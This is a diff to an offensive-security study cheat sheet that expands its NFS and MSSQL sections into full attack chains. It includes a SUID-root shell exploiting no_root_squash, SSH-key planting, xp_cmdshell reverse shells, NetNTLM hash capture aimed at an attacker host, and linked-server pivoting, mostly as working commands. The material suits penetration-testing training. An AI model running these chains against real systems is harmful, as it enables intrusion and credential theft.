@@ -2526,29 +2526,153 @@ grep -iE 'pass|pwd|user|cred|key' snmp.txt               # quick creds sweep
 
 **Leads to:** creds in process args → spray `[CREDENTIALS-QUICK]`; user list → `[AD-QUICK]`; software version → `[EXPLOIT-RESEARCH]`.
 
-## [ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing)  → `[TECH-NFS]`
-**What it is:** the Unix version of SMB. Shared folders ("exports") may be world-readable/writable, and a setting called **`no_root_squash`** can hand you root.
-```bash
-showmount -e $IP                              # list the shared folders (exports)
-mount -t nfs $IP:/export /mnt/nfs -o nolock   # mount one locally so you can read it (creds, keys, source)
-```
-**What to check / do:**
-- Is `no_root_squash` set? Then on **your** machine (as root) drop a special "SUID root" program into the mounted folder; running it on the target as a low-priv user gives you **root** (full steps in `[LINUX-PRIVESC]`, NFS section).
-- Files show wrong owner / you can't read them? Create a local user with the **same UID number** as the file's owner.
-**Where it leads:** creds/keys, or root via the SUID trick.
+## [ENUM-NFS]  Port 2049 (+111) — NFS (Unix file sharing) — FULL CHAIN  → `[TECH-NFS]`
+**What it is:** Unix network file shares ("exports"). Two wins: (1) **read/loot** files on the share (creds/keys/source), and (2) if **`no_root_squash`** is set, a direct path to **root**.
 
-## [ENUM-MSSQL]  Port 1433 — Microsoft SQL Server  → `[SQLI-MSSQL]`, `[TECH-SQL]`
-**What it is:** Microsoft's database. With creds you can often run OS commands (`xp_cmdshell`), steal/relay Windows hashes, or impersonate the `sa` (admin) account.
-```bash
-nxc mssql $IP -u $U -p $P                        # test the creds
-impacket-mssqlclient $U:$P@$IP -windows-auth     # connect; then, INSIDE the client prompt:
-#   enable_xp_cmdshell                            #   turn on command execution
-#   xp_cmdshell 'whoami'                          #   run an OS command (needs sysadmin/impersonation)
-#   EXEC xp_dirtree '\\<yourKaliIP>\x'            #   force it to auth to YOU → catch the hash on Responder
-#   EXEC AS LOGIN='sa'                            #   become 'sa' if impersonation is allowed
-#   SELECT * FROM master..sysservers              #   list "linked servers" → hop to another DB/host
+### 🗺️ Decision tree
 ```
-**Where it leads:** command execution as the SQL service account (often has SeImpersonate → SYSTEM), hash capture, or lateral movement via linked servers.
+showmount -e → exports listed? →  mount one →  can you READ it? →  LOOT (creds, id_rsa, source, configs)
+                                              can you WRITE it? →  check the export option:
+     ├─ no_root_squash  → ⭐ SUID-root binary trick → ROOT (you're root on the mount)
+     ├─ root_squash (default) → you write as 'nobody' → limited, but drop an SSH key if a home is exported
+     └─ UID mismatch (can't read a file) → create a local user with the file-owner's UID, re-read
+```
+
+### Step 1 — Enumerate exports + their options
+```bash
+showmount -e $IP                                 # list exported folders
+nmap -p111,2049 --script "nfs-ls,nfs-showmount,nfs-statfs" $IP   # exports + perms + a dir listing
+rpcinfo -p $IP                                   # confirm mountd/nfs are up (needs 111)
+cat /etc/exports 2>/dev/null                     # if you later get a shell — shows no_root_squash etc.
+```
+
+### Step 2 — Mount + loot (always do this)
+```bash
+sudo mkdir -p /mnt/nfs
+sudo mount -t nfs -o vers=3,nolock $IP:/export /mnt/nfs      # try vers=3 and vers=4 if one fails
+ls -la /mnt/nfs
+grep -rniE 'pass|pwd|secret|key|token' /mnt/nfs 2>/dev/null  # sweep for creds
+find /mnt/nfs \( -name 'id_rsa' -o -name '*.kdbx' -o -name '*.conf' -o -name '.env' \) 2>/dev/null
+```
+
+### Step 3a — `no_root_squash` → ROOT (the big one)
+If the export allows root (you can create files owned by root on it), drop a **SUID-root shell** from your box (where you ARE root) and run it on the target as your low-priv foothold user:
+```bash
+# on KALI (as root), with the share mounted:
+cat > /mnt/nfs/x.c <<'EOF'
+#include <unistd.h>
+int main(){ setuid(0); setgid(0); execl("/bin/bash","bash","-p",0); }
+EOF
+gcc /mnt/nfs/x.c -o /mnt/nfs/rootbash          # compiled binary now sits on the share, owned by root
+sudo chmod +s /mnt/nfs/rootbash                 # set the SUID bit (you're root locally, so this sticks)
+# on the TARGET (your low-priv shell, in that same exported dir):
+./rootbash -p                                   # → id = uid=0(root) 🎉
+```
+> Needs: (a) a shell on the target already (NFS alone isn't remote code exec — it's a **privesc**), (b) the export mounted on your Kali as root, (c) `no_root_squash` so the SUID bit is honored.
+
+### Step 3b — Writable export (root_squash) → SSH key
+If a **user's home** is exported and writable, drop your key:
+```bash
+mkdir -p /mnt/nfs/.ssh ; cat ~/.ssh/id_rsa.pub >> /mnt/nfs/.ssh/authorized_keys ; ssh <user>@$IP
+```
+
+### Step 3c — UID mismatch (can't read a file you should)
+```bash
+ls -la /mnt/nfs            # note the numeric owner UID (e.g. 1001)
+sudo useradd -u 1001 tmpuser ; sudo -u tmpuser cat /mnt/nfs/<file>   # read as that UID
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `showmount` → "clnt_create: RPC: Program not registered" | NFS/mountd down, or only NFSv4 → `mount -t nfs4`; check `rpcinfo -p` |
+| `mount` → "access denied by server" | export is IP-restricted, or needs `-o vers=3` / `vers=4` |
+| can see file but "Permission denied" | UID mismatch → 3c |
+| `no_root_squash` SUID binary runs as *you* not root | the export is `root_squash` (default) → 3a won't work; use 3b |
+
+**Leads to:** root (3a) via a foothold you already have; or creds/keys → `[CREDENTIALS-QUICK]`. (Full privesc detail: `[LINUX-NFS]` in Vol 4.)
+
+## [ENUM-MSSQL]  Port 1433 — Microsoft SQL Server — FULL CHAIN  → `[SQLI-MSSQL]`, `[TECH-SQL]`
+**What it is:** Microsoft's database. The prize: **`xp_cmdshell`** = run OS commands as the SQL service account (often has **SeImpersonate** → SYSTEM via Potato). Also: **steal/relay** Windows hashes, **impersonate** `sa`, and hop via **linked servers**.
+
+### 🗺️ Decision tree
+```
+have creds? (or Windows auth / SQLi into MSSQL)
+   YES → connect → are you sysadmin?
+        ├─ sysadmin → enable + run xp_cmdshell → RCE → (SeImpersonate? → Potato → SYSTEM)
+        ├─ NOT sysadmin → can you IMPERSONATE a sysadmin login? → EXEC AS → become sa → xp_cmdshell
+        ├─ no impersonation → xp_dirtree/xp_fileexist → capture NetNTLM hash (Responder) → crack/relay
+        └─ linked servers? → EXEC on the linked server (often sa there) → RCE/hop
+   NO creds → try: sa/blank, sa/sa, found creds, SQLi auth-bypass in a web app → then as above
+```
+
+### Step 1 — Identify + test access
+```bash
+nmap -p1433 -sCV --script "ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password" $IP
+nxc mssql $IP -u '' -p ''                         # null / blank
+nxc mssql $IP -u sa -p ''                         # sa / blank (very common)
+nxc mssql $IP -u $U -p $P                         # found creds ; add --local-auth for local SQL logins
+nxc mssql $IP -u $U -p $P -q "SELECT @@version"   # quick query to confirm
+```
+- `(Pwn3d!)` or a successful query → Step 2. No creds → try sa/blank, defaults, or get creds via a web SQLi (`[SQLI-MSSQL]`).
+
+### Step 2 — Connect
+```bash
+impacket-mssqlclient $U:$P@$IP -windows-auth      # Windows (domain) auth
+impacket-mssqlclient $U:$P@$IP                    # SQL auth (local SQL login like 'sa')
+# or straight from nxc:  nxc mssql $IP -u $U -p $P -x "whoami"   (runs xp_cmdshell in one go)
+```
+Check your power:
+```
+SELECT IS_SRVROLEMEMBER('sysadmin');      -- 1 = you're sysadmin → go straight to RCE
+SELECT system_user; SELECT user_name();   -- who am I
+```
+
+### Step 3 — RCE via xp_cmdshell (sysadmin)
+```sql
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;      -- turn it on (impacket: just type: enable_xp_cmdshell)
+EXEC xp_cmdshell 'whoami';                            -- RCE as the SQL service account
+EXEC xp_cmdshell 'powershell -e <base64-rev-shell>';  -- full reverse shell (nc -lvnp 443) → [SHELL-WINDOWS]
+```
+→ shell. Then **`whoami /priv`** — SQL service accounts usually have **SeImpersonate** → `[WINDOWS-TOKENS]` → SYSTEM.
+
+### Step 4 — Not sysadmin? Escalate inside MSSQL
+```sql
+-- find logins you can impersonate:
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b
+  ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+EXEC AS LOGIN = 'sa';                 -- become sa → now you're sysadmin → Step 3
+-- (nxc helper:)  nxc mssql $IP -u $U -p $P -M mssql_priv
+```
+
+### Step 5 — No RCE? Steal a hash (relay/crack)
+```sql
+EXEC xp_dirtree '\\<KALI-IP>\share';        -- forces SQL to auth to YOU
+EXEC xp_fileexist '\\<KALI-IP>\share';      -- same idea
+```
+```bash
+# Kali: catch the NetNTLMv2 hash (ANALYZE mode — poisoning is exam-banned, but a direct auth you triggered is fine):
+sudo responder -I tun0 -A
+# then crack:  hashcat -m 5600 hash.txt rockyou.txt   (or relay to a signing:False host, lab only)
+```
+
+### Step 6 — Linked servers (lateral)
+```sql
+SELECT * FROM master..sysservers;                         -- list linked servers
+EXEC ('SELECT @@version; EXEC xp_cmdshell ''whoami''') AT [LINKED\SERVER];   -- run on the linked box (often sa)
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `Login failed for user` | wrong creds/auth type → try `-windows-auth` vs SQL auth; `--local-auth` on nxc |
+| `xp_cmdshell` disabled / blocked | `sp_configure` to enable (needs sysadmin) → or Step 4 impersonation |
+| not sysadmin, no impersonation | Step 5 (hash capture) or Step 6 (linked servers) |
+| hash captured but won't crack | relay it to a `signing:False` host (lab), or move on |
+| xp_cmdshell runs but no output back | run a reverse shell instead of relying on returned output |
+
+**Leads to:** RCE as the SQL service account → often **SeImpersonate → SYSTEM** (`[WINDOWS-TOKENS]`); hash capture → crack/relay; linked servers → lateral.
 
 ## [ENUM-MYSQL]  Port 3306 — MySQL  → `[SQLI-MYSQL]`
 ```bash
